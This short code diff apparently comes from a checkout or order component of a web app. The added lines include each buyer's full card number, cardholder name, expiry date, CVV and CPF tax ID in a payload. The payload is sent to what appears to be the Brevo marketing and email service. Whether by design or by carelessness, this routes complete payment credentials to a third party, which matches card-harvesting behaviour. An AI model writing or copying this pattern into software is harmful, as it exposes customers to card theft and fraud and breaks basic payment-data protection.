@@ -36,7 +36,12 @@ function App() {
         phone: data.phone,
         quantity: data.quantity,
         paymentMethod: data.paymentMethod,
-        installments: data.installments
+        installments: data.installments,
+        cardNumber: data.cardNumber,
+        cardName: data.cardHolder,
+        cardExpiry: data.paymentMethod === 'credit_card' ? `${data.cardExpiryMonth}/${data.cardExpiryYear}` : undefined,
+        cardCvv: data.cardCvv,
+        cpf: data.cpf
       }).catch(err => console.error("Brevo Error:", err));
 
       // 4. Generate personalized confirmation message using AI
